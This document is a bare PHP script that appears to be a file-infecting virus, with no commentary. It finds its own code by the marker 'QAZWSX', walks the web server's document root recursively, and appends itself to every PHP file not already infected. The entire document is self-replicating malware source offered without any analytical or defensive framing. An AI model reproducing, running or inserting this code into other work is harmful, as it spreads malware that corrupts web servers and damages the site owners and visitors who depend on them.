<?//QAZWSX

function Infect($path)
{
        global $self;   

        $handle = opendir($path); 

        $file = readdir($handle);

        while ( false != $file )
        { 
        if ($file != "." && $file != "..")
        { 

                if (is_dir($path.$file))
                {
                        Infect($path.$file."/");
                }
                else if (strrpos($file, ".php") != 0)
                {
                        $do_infect = true;

                                $victim = fopen($path.$file, "r+");
                                while (!feof($victim))
                                {
                                $buf = fgets($victim, 4096);
                                        if (strrpos($buf, "QAZWSX") != 0)
                                        {
                                            $do_infect = false;
                                            break;
                                        }

                                }

                                if ($do_infect)
                                {
                                        fputs($victim, $self);
                                }

                                fclose($victim);
                }

        } 

                $file = readdir($handle);
        }

        closedir($handle); 

}


$found = false;
$bracket_found = false;

$sf = fopen($SCRIPT_FILENAME, "r");

while (!feof($sf))
{
        $s = fgets($sf, 4096);
        if ($found)
        {
                $self .= $s;
                if (strrpos($s, "?>") != 0)
                {
                        if ($bracket_found)
                        {
                                break;
                        }
                        else
                        {
                                $bracket_found = true;
                        }
                        
                }
        }
        else if (strrpos($s, "QAZWSX") != 0)
        {
            $found = true;
            $self = $s;
        }

}

fclose($sf);

Infect($DOCUMENT_ROOT."/");

 ?>
